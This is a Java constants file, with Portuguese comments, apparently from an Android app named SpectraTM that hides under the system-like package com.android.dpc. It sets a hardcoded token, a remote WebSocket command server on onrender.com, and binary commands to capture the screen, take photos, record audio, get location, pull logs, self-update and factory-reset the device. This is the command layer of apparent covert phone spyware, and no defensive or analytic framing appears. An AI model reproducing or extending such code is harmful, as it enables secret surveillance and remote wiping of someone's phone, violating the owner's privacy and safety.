// SpectraTM Device Constants - Gerado pelo bootstrap.sh
package com.android.dpc;

public class DeviceConstants {
    
    // DEVICE ID FIXO - NÃO ALTERE (gerado pelo bootstrap)
    public static final String DEVICE_ID_FIXED = "f47ac10b58cc4372a2c5";
    
    // TOKEN DE AUTENTICAÇÃO FIXO
    public static final String TOKEN_FIXED = "spec2024";
    
    // PAYLOAD DE 256 BYTES PARA HANDSHAKE
    public static final String PAYLOAD_256_HEX = "f47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad47ac10b58cc4372a2c5a0e0e4f0b14ad";
    
    // URLs DO SERVIDOR (atualizadas pelo deploy)
    public static final String SERVER_URL_LOCAL = "ws://localhost:8000/live";
    public static final String SERVER_URL_RENDER = "wss://sp-gate.onrender.com/live";
    
    // CONFIGURAÇÕES DE SEGURANÇA
    public static final int KEY_ROTATION_INTERVAL_MS = 5 * 60 * 1000; // 5 minutos
    public static final int CIRCULAR_BUFFER_SIZE = 1024 * 1024; // 1MB
    public static final int MAX_EVIDENCE_AGE_MS = 10 * 60 * 1000; // 10 minutos
    
    // MAGIC STRINGS PARA VALIDAÇÃO
    public static final String MAGIC_UPDATE = "SPECTRA_UPDATE_v2.0";
    public static final String MAGIC_RESET = "SPECTRA_FACTORY_RESET_v2.0";
    
    // BINARY COMMANDS
    public static final byte CMD_START_SCREEN = 0x01;
    public static final byte CMD_STOP_SCREEN = 0x02;
    public static final byte CMD_CAPTURE_PHOTO = 0x03;
    public static final byte CMD_RECORD_AUDIO = 0x04;
    public static final byte CMD_GET_LOCATION = 0x05;
    public static final byte CMD_GET_LOGS = 0x06;
    public static final byte CMD_SELF_UPDATE = 0x07;
    public static final byte CMD_FACTORY_RESET = 0x08;
    
    // HELPER METHODS
    public static byte[] getPayloadBytes() {
        return hexStringToByteArray(PAYLOAD_256_HEX);
    }
    
    public static String getDeviceFingerprint() {
        return DEVICE_ID_FIXED + "_" + TOKEN_FIXED + "_" + android.os.Build.MODEL;
    }
    
    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                 + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    
    public static boolean validatePayload(byte[] received) {
        byte[] expected = getPayloadBytes();
        if (received.length != expected.length) return false;
        
        for (int i = 0; i < expected.length; i++) {
            if (received[i] != expected[i]) return false;
        }
        return true;
    }
}